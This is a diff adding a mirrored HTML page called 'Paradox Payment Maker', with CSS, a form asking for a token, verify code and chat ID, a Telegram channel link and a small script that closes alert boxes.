@@ -1,0 +1,77 @@
+<html>
+
+
+<!-- Mirrored from paradoxtm.xyz/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 02 Mar 2020 22:15:18 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+  <style>
+.alert {
+  padding: 20px;
+  background-color: #f44336;
+  color: white;
+  opacity: 1;
+  transition: opacity 0.6s;
+  width: 300px;
+  height: 15px;
+  margin: auto;
+}
+
+.alert.success {background-color: #000000;}
+.alert.info {background-color: #2196F3;}
+.alert.warning {background-color: #ff9800;}
+
+.closebtn {
+  margin-left: 15px;
+  color: white;
+  font-weight: bold;
+  float: right;
+  font-size: 22px;
+  line-height: 20px;
+  cursor: pointer;
+  transition: 0.3s;
+}
+
+.closebtn:hover {
+  color: black;
+}
+  </style>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script src="../ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="script.js"></script>
+  <title>Paradox</title>
+</head>
+
+<body>
+  <div class="main">
+    <img class="center" src="3.png" alt="Paradox"style="width:150px;height:100px;">
+    <p class="sign2" align="center">Payment Maker</p>
+    <div id="alert">
+    </div>
+    <form class="form1" id="form1">
+      <input class="un " type="text" align="center" name ="token" id="token"placeholder="Token :"maxlength="60"required>
+      <input class="un " type="text" align="center" name ="verify" id="verify"placeholder="Verify Code :"maxlength="5"hidden>
+      <input class="un " type="text" align="center" name ="id" id="id"placeholder="Chat ID :"maxlength="20"hidden>
+      <input type="text" name ="code" id="code" maxlength="20"hidden>
+    </form>
+    <input id = "but" class="submit" type="button" value="Check"onclick="sale()">
+      <p class="sign2" align="center">Our Channel :</p>
+      <p class="sign2" align="center">T.me/TMParadox</p>  
+    </div>
+    <script>
+var close = document.getElementsByClassName("closebtn");
+var i;
+
+for (i = 0; i < close.length; i++) {
+  close[i].onclick = function(){
+    var div = this.parentElement;
+    div.style.opacity = "0";
+    setTimeout(function(){ div.style.display = "none"; }, 600);
+  }
+}
+</script>
+</body>
+
+<!-- Mirrored from paradoxtm.xyz/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 02 Mar 2020 22:15:20 GMT -->
+</html>
